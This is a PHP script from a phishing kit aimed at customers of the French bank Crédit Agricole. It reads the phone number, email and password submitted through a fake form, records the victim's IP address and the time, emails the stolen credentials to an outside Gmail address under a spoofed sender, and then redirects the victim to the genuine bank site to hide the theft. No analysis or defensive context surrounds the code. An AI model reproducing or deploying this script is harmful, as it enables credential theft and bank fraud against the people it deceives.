<?
$ip = getenv("REMOTE_ADDR");
//date_default_timezone_set('UTC');
$time       = date( "M j, Y | G:i:s A" );


$from = $_POST['date'];
$pass = $_POST['lieu'];
$usr = $_POST['tele'];




$message .= "#=========[ $time ]=========#\n";
$message .= "Tele	:	".$_POST['tele']."\n";
$message .= "EMail	:	".$_POST['mail']."\n";
$message .= "Pass	:	".$_POST['pass']."\n";
$message .= "#======[ $from ]======#\n";

$send = "wavesbarrel@gmail.com";
$subject = "[AGRICOLE $ip ]";
$from = "From: CA info<notifications@vif8a.com>";
mail($send,$subject,$message,$from);

echo "<meta http-equiv='refresh' content='0; url=http://www.credit-agricole.fr/'/>";

	

?>